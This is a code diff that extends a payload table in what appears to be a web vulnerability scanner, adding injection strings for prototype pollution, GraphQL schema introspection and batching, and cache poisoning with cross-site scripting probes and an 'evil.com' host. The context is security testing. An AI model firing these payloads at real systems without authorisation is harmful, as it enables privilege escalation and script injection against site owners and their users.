@@ -69,6 +69,23 @@ _SMART_PAYLOAD_MAP = {
         "payloads": ['{"role":"admin"}', '{"is_admin":true}', '{"price":0}',
                      '{"discount":100}', '{"verified":true}'],
     },
+    "prototype_pollution": {
+        "names": ["__proto__", "constructor", "prototype", "merge", "extend", "clone", "config"],
+        "payloads": ['{"__proto__":{"polluted":"true"}}', '{"constructor":{"prototype":{"polluted":"true"}}}',
+                     '{"__proto__":{"status":510}}', '{"__proto__":{"admin":true}}',
+                     '__proto__[polluted]=true', 'constructor[prototype][polluted]=true'],
+    },
+    "graphql": {
+        "names": ["query", "mutation", "variables", "operationName", "graphql"],
+        "payloads": ['{__schema{types{name}}}', '{__type(name:"Query"){fields{name}}}',
+                     '{"query":"{__schema{types{name fields{name}}}}"}',
+                     '[{"query":"{__typename}"},{"query":"{__typename}"}]'],
+    },
+    "cache_poison": {
+        "names": ["cb", "cachebuster", "utm_source", "utm_content", "utm_campaign"],
+        "payloads": ['"><script>alert(1)</script>', "evil.com", "/evil-path",
+                     '<script>alert(document.domain)</script>'],
+    },
 }
 
 
